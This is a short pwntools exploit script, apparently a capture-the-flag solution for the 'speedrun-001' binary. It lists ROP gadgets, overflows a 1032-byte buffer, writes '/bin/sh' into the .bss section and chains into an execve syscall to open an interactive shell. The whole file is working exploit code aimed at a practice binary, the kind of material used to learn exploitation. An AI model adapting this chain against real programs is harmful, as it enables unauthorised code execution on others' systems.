from pwn import *

context.arch = "amd64"
elf = ELF("./speedrun-001")
target = process("./speedrun-001")
bss_addr = elf.bss()

# ROPgadget --binary ./speedrun-001 --only "pop|ret" | grep -E "rdi|rsi|rdx|rax"
# 0x00415664 : pop rax ; ret
# 0x00400686 : pop rdi ; ret
# 0x0044be16 : pop rdx ; ret
# 0x004101f3 : pop rsi ; ret

# ROPgadget --binary ./speedrun-001 --only "syscall"
# 0x0040129c : syscall

# ROPgadget --binary ./speedrun-001 --only "mov|ret"
# 0x00418397 : mov qword ptr [rdx], rax ; ret

pop_rdi = 0x00400686
pop_rsi = 0x004101F3
pop_rdx = 0x0044BE16
pop_rax = 0x00415664
syscall = 0x0040129C
write_gadget = 0x418397

target_addr = elf.bss() + 0x100

padding = b"A" * (1024 + 8)

payload = flat(
    padding,
    pop_rdx,
    target_addr,
    pop_rax,
    b"/bin/sh\x00",
    write_gadget,
    pop_rdi,
    target_addr,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3B,
    syscall,
)

target.sendlineafter(b"Any last words?\n", payload)
target.interactive()
